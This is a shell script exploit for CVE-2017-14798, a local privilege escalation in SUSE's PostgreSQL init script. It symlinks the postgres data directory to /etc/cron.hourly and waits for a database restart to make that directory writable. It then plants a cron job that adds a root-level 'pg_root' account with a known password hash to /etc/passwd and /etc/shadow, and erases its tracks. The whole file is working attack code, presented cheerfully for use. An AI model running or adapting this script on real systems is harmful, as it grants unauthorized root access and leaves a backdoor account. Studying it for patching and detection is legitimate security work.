# Exploit Author: Johannes Segitz
# Vendor Homepage: https://bugzilla.suse.com/show_bug.cgi?id=1062722
# Software Link: -
# Version: Before postgresql-init-9.4-0.5.3.1
# Tested on: SUSE Linux Enterprise 11 SP4
# CVE : CVE-2017-14798
 
#!/bin/sh
 
# don&#039;t use spaces or other funny characters in here
CRON_DIR=&#039;/etc/cron.hourly&#039;
CRON_FILE="$CRON_DIR/totally_not_a_lpe"
 
declare -a CLEANUP_ELEMENTS=(&#039;base&#039; &#039;global&#039; &#039;pg_clog&#039; &#039;pg_hba.conf&#039; &#039;pg_ident.conf&#039; &#039;pg_multixact&#039; &#039;pg_subtrans&#039; &#039;pg_tblspc&#039; &#039;pg_twophase&#039; &#039;PG_VERSION&#039; &#039;pg_xlog&#039; &#039;postgresql.conf&#039;)
 
if [ "$(whoami)" != "postgres" ]; then
  echo "Must be run as user postgres"
  exit -1
fi
cd
 
echo setting up exploit
mv data data2
ln -s $CRON_DIR data
 
echo waiting for DB restart
while [ ! -w $CRON_DIR ]; do
  sleep 1 
done
 
echo able to write $CRON_DIR
echo &#039;#!/bin/sh&#039; > $CRON_FILE
echo &#039;echo &#039;"&#039;"&#039;pg_root:x:0:0:,,,:/home/pg_root:/bin/bash&#039;"&#039;"&#039; >> /etc/passwd&#039; >> $CRON_FILE
echo &#039;echo &#039;"&#039;"&#039;pg_root:$2y$05$6F6hHGfvZ42Mq1EF8V.e8uguGumaZsZ4P9qfjiuHFT/k8B2CZrJaO:16339:0:99999:7:::&#039;"&#039;"&#039; >> /etc/shadow&#039; >> $CRON_FILE
echo "rm $CRON_FILE" >> $CRON_FILE
echo "chown root.root ${CRON_DIR}" >> $CRON_FILE
chmod +x $CRON_FILE
 
if [ -e $CRON_FILE ]; then
  echo wrote $CRON_FILE
else
  echo failed to write $CRON_FILE, exiting
  exit 1
fi
 
echo cleaning up
for i in "${CLEANUP_ELEMENTS[@]}"; do
   rm -rf "$CRON_DIR/$i"
done
rm data
mv data2 data 
 
echo now wait, depending on CRON_DIR setting you should be able to log into this system with pg_root:foobar soonish. Enjoy!

